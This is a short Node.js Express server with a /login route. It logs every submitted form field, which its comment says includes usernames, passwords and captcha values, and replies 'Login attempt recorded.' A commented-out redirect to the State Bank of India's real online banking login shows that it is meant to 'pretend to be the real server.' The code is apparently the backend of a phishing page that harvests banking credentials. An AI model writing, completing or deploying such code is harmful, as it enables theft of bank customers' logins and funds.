const express = require('express');
const app = express();

// Important: parse application/x-www-form-urlencoded (that's what <form> sends)
app.use(express.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    console.log('──────────────────────────────');
    console.log('Form data received:');
    console.log(req.body);               // ← this contains username, password, loginCaptchaValue, etc.
    console.log('──────────────────────────────');

    // Optional: pretend to be the real server (redirect or show error)
    // res.redirect('https://retail.onlinesbi.sbi/login');   // or whatever
    res.send('Login attempt recorded.');   // or send HTML error page
});

app.listen(3000, () => {
    console.log('Backend listening →  http://localhost:3000');
});